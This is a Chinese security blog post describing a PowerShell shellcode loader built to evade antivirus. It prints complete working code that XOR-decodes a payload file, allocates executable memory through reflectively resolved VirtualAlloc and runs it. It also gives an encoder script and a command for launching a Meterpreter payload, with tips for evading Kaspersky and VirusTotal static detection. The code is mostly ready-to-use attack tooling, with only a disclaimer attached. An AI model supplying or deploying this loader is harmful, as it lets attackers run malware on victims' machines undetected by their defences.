> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [www.chabug.org](https://www.chabug.org/web/1312.html)

Powershell免杀（shellcode加载器）
==========================

[s1ye](/author/s1ye) • 2020年3月1日 pm7:12 • [渗透测试](/topics/web) • 阅读 5893

### 加载器（loader）

> loader就是分离免杀的一种，从远程文件或本地其他文件读取shellcode，并加载到内存执行。

网络上很多语言的加载器都有，但是powershell的感觉不太常见，powershell版的loader也是在学习过程中的一个产物，只是一种思路，因为powershell完全可以实现无文件落地。两种形式：

*   loader + shellcode
*   loader + bin文件

本文采用的是loader + bin文件的形式。

**声明：** 文章内容仅供网络安全爱好者学习使用，请勿用文章中提到的技术或工具做违法的事情，否则后果自负。

* * *

### 实现过程

很常见的思路，利用亦或xor混淆生成新的bin文件，再用加载器读取bin中的字节数组并在内存执行（直接用cs原生的payload）。

```
Set-StrictMode -Version 2



function get_delegate_type {
    Param (
        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $parameters,
        [Parameter(Position = 1)] [Type] $return_type = [Void]
    )

    $type_builder = [AppDomain]::CurrentDomain.
    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $type_builder.
    DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $parameters).SetImplementationFlags('Runtime, Managed')
    $type_builder.
    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $return_type, $parameters).SetImplementationFlags('Runtime, Managed')

    return $type_builder.
    CreateType()
}


function get_proc_address {
    Param ($var_module, $var_procedure)     
    $var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $var_gpa = $var_unsafe_native_methods.
    GetMethod('GetProcAddress', [Type[]] @('System.Runtime.InteropServices.HandleRef', 'string'))
    return $var_gpa.
    Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod('GetModuleHandle')).Invoke($null, @($var_module)))), $var_procedure))
}



If ([IntPtr]::size -eq 8) {


    [Byte[]]$code = [System.IO.File]::
    ReadAllBytes($args[0])

    for ($x = 0; $x -lt $code.Count; $x++) {
        $code[$x] = 26 -bxor $code[$x]
    }


    $var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((get_proc_address kernel32.dll VirtualAlloc), (get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))
    $var_buffer = $var_va.Invoke([IntPtr]::Zero, $code.Length, 0x3000, 0x40)

    [System.Runtime.InteropServices.Marshal]::Copy($code, 0, $var_buffer, $code.length)

    $runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (get_delegate_type @([IntPtr]) ([Void])))
    $runme.Invoke([IntPtr]::Zero)
} 
```

PowerShellCopy

通过测试发现，kaspersky（卡巴斯基）拦截 FromBase64String()这个方法，导致不能将字节数组编码后传入。因此想到修改获取字节数组的方法，才导致了这个loader的产生。

过静态查杀的思路： 修改原payload中的函数名、变量名以及函数定义的顺序（可过VT上一些国外的查杀）。替换frombase64string方法，可绕过卡巴斯基查杀。

![Powershell免杀（shellcode加载器）](/wp-content/uploads/2020/03/dWr8MTEY3fNpnUF.png) [![Powershell免杀（shellcode加载器）](https://ae01.alicdn.com/kf/Uf8bc8505674e4a058d3c52481e6fc567E.png)](/wp-content/uploads/2020/03/dWr8MTEY3fNpnUF.png)

![Powershell免杀（shellcode加载器）](/wp-content/uploads/2020/03/vNK6U48mX9sV3D2.png) [![Powershell免杀（shellcode加载器）](https://ae01.alicdn.com/kf/Uf8bc8505674e4a058d3c52481e6fc567E.png)](/wp-content/uploads/2020/03/vNK6U48mX9sV3D2.png)

* * *

### 使用方法

#### 生成新的bin文件

```
# xor.ps1
# usage:   .xor.sp1 .payload.bin .enc.bin

[Byte[]]$bytes = [System.IO.File]::ReadAllBytes($args[0])

for ($x = 0; $x -lt $bytes.Count; $x++) {
        $bytes[$x] = $bytes[$x] -bxor 26
}

$infile = [System.IO.File]::WriteAllBytes($args[1],$bytes) 
```

#### powershell加载shellcode

> powershell meterpreter.ps1 .enc.bin

![Powershell免杀（shellcode加载器）](/wp-content/uploads/2020/03/2O5jyYCxZlNrPcX.png) [![Powershell免杀（shellcode加载器）](https://ae01.alicdn.com/kf/Uf8bc8505674e4a058d3c52481e6fc567E.png)](/wp-content/uploads/2020/03/2O5jyYCxZlNrPcX.png)

* * *

### 结束语

内容基础且简单，不涉及底层的知识（因为暂时我还没那个能力，后面随着学习会继续补充）。

原创文章，作者：s1ye，未经授权禁止转载！如若转载，请联系作者：s1ye

赞 (3) [![](https://cdn.v2ex.com/gravatar/e3e0a1196b588763b23cee879739ee55?s=60&d=identicon&r=g) s1ye ](/author/s1ye) [ 0](javascript:;) [ 0](#comments) [  ![微信扫一扫](https://y4er.com/img/reward/wechat.png) 微信扫一扫 ![支付宝扫一扫](https://y4er.com/img/reward/alipay.png) 支付宝扫一扫 ](javascript:;) [ 生成分享图片](javascript:;) [  扫码分享到微信 ](javascript:;) [](http://service.weibo.com/share/share.php?url=%2Fweb%2F1312.html&title=Powershell%E5%85%8D%E6%9D%80%EF%BC%88shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%EF%BC%89&pic=%2Fwp-content%2Fuploads%2F2020%2F03%2F2020030111111430.png&searchPic=true) [](https://connect.qq.com/widget/shareqq/index.html?url=%2Fweb%2F1312.html&title=Powershell%E5%85%8D%E6%9D%80%EF%BC%88shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%EF%BC%89&pics=%2Fwp-content%2Fuploads%2F2020%2F03%2F2020030111111430.png) [](javascript:;) [ powershell免杀（cs powershell command解析） ](/web/1307.html "powershell免杀（cs powershell command解析）") « 上一篇 2020年3月1日 pm7:11 [ Powershell免杀（远程加载shellcode） ](/web/1317.html "Powershell免杀（远程加载shellcode）") 下一篇 » 2020年3月1日 pm7:14

### 相关推荐

*   [利用异或无限免杀webshell过D盾 PHP/ASPX/ASP/JSP](/tools/657.html "利用异或无限免杀webshell过D盾 PHP/ASPX/ASP/JSP")
*   [Cobalt Strike Malleable C2 配置](/web/832.html "Cobalt Strike Malleable C2 配置")
*   [[XSS防御]HttpOnly之四两拨千斤](/web/477.html "[XSS防御]HttpOnly之四两拨千斤")
*   [xss tv 挑战笔记](/web/503.html "xss tv 挑战笔记")
*   [upload-labs-writeup：upload-labs 上传漏洞靶场的解题方法](/web/470.html "upload-labs-writeup：upload-labs 上传漏洞靶场的解题方法")
*   [sqlmap tamper编写](/web/1039.html "sqlmap tamper编写")
*   [SMB空指针引用攻击（CVE-2018-0833）复现](/web/514.html "SMB空指针引用攻击（CVE-2018-0833）复现")
*   [Mysql日志拿shell](/web/326.html "Mysql日志拿shell")
*   [解析漏洞详解](/web/357.html "解析漏洞详解")
*   [看我如何拿下某建站公司](/web/654.html "看我如何拿下某建站公司")